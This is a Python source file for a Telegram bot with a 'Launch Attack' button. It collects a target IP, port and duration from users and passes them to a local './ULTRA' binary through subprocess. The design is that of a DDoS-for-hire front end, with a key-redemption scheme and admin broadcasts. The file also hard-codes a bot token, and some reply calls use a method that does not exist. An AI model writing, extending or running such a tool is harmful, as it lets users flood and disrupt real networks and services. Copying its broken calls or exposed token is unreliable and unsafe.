import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
import logging

# Your bot's token
TELEGRAM_BOT_TOKEN = '7718765612:AAEsrz7uXxsq_aDoPjncPdOD73z3WLOEVz0'

# Admin user ID
ALLOWED_USER_ID = 6135948216  # Replace with your admin's Telegram user ID

# In-memory storage for tracking generated keys (for demo purposes)
generated_key = "example_key"
key_redeemed = True

# Store user IDs (for broadcast)
user_ids = set()

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# User state storage
user_state = {}

# Start command to display the styled buttons
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    # Add user to the list of users who have interacted with the bot
    user_ids.add(update.effective_user.id)

    # Create inline keyboard buttons with styling
    keyboard = [
        [InlineKeyboardButton("⚡ Launch Attack ⚡", callback_data='launch_attack')],
        [InlineKeyboardButton("📊 Check Status", callback_data='check_status')],
        [InlineKeyboardButton("❓ Help", callback_data='help')],
        [InlineKeyboardButton("🔑 Redeem Key", callback_data='redeem_key')],
    ]
    
    # Create reply markup to include the keyboard with buttons
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send a styled message with the inline buttons
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use the buttons below to proceed!*\n"
    )
    await context.bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown',  # Markdown allows styling like bold, italics, etc.
        reply_markup=reply_markup  # Attach the inline keyboard to the message
    )

# Handle the button presses
async def handle_button(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # Acknowledge the button press

    # Different actions for different button presses
    if query.data == 'launch_attack':
        # Ask for IP, Port, and Duration
        await query.edit_message_text("🔧 *Please provide the IP address for the attack:*")
        user_state[query.from_user.id] = {'step': 'ip'}
    elif query.data == 'check_status':
        # Show current key and redemption status
        status_message = (
            "*🔑 Current Key: " + (generated_key if generated_key else "No key generated yet") + "*\n"
            "*Status: " + ("Redeemed" if key_redeemed else "Not redeemed") + "*"
        )
        await query.edit_message_text(status_message, parse_mode='Markdown')
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ *Help Information goes here.* ❓\n\n"
            "*Use the following commands:* \n"
            "- `⚡ Launch Attack`: Executes the `./ULTRA` binary with specified IP, port, and duration.\n"
            "- `🔑 Redeem Key`: Redeems the current key if available."
        )
    elif query.data == 'redeem_key':
        global key_redeemed
        if not key_redeemed:
            key_redeemed = True
            await query.edit_message_text(f"*🔑 Key Redeemed Successfully!* \nYour key: {generated_key}", parse_mode='Markdown')
        else:
            await query.edit_message_text("*⚠️ Key already redeemed!*", parse_mode='Markdown')

# Handle text messages for input collection
async def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_state:
        return

    state = user_state[user_id]

    if state['step'] == 'ip':
        # Save IP address and ask for port
        user_state[user_id]['ip'] = text
        await update.message.reply("🌐 *IP saved!* Now, please provide the port number:")
        user_state[user_id]['step'] = 'port'
    elif state['step'] == 'port':
        # Save port and ask for duration
        user_state[user_id]['port'] = text
        await update.message.reply("⚙️ *Port saved!* Now, please provide the duration of the attack in seconds:")
        user_state[user_id]['step'] = 'duration'
    elif state['step'] == 'duration':
        # Save duration and execute attack
        user_state[user_id]['duration'] = text
        ip = user_state[user_id]['ip']
        port = user_state[user_id]['port']
        duration = user_state[user_id]['duration']
        
        # Run the ./ULTRA binary with parameters
        try:
            result = subprocess.run(["./ULTRA", ip, port, duration], capture_output=True, text=True)
            output = result.stdout if result.returncode == 0 else result.stderr
            await update.message.reply(f"⚡ *Attack Launched!* ⚡\n\n*ULTRA Output:* {output}")
        except Exception as e:
            await update.message.reply(f"⚠️ *Failed to execute ./ULTRA:* {str(e)}")
        
        # Reset state after execution
        del user_state[user_id]

# Broadcast command for the admin to send a message to all users
async def broadcast(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Ensure there is a message to broadcast
    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must provide a message to broadcast!*", parse_mode='Markdown')
        return

    # Get the message from the user's input
    broadcast_message = ' '.join(context.args)

    # Send the broadcast message to all users
    for user_id in user_ids:  # Assuming user_ids is a set of all users who have interacted with the bot
        try:
            await context.bot.send_message(user_id, broadcast_message, parse_mode='Markdown')
        except Exception as e:
            print(f"Failed to send message to {user_id}: {e}")

    await context.bot.send_message(chat_id=chat_id, text="*📢 Broadcast message sent to all users!*", parse_mode='Markdown')

# Main function to run the bot
def main():
    """Start the bot and set up the handlers."""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("broadcast", broadcast))

    # Button callback handler
    application.add_handler(CallbackQueryHandler(handle_button))

    # Message handler to capture user input for attack parameters
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
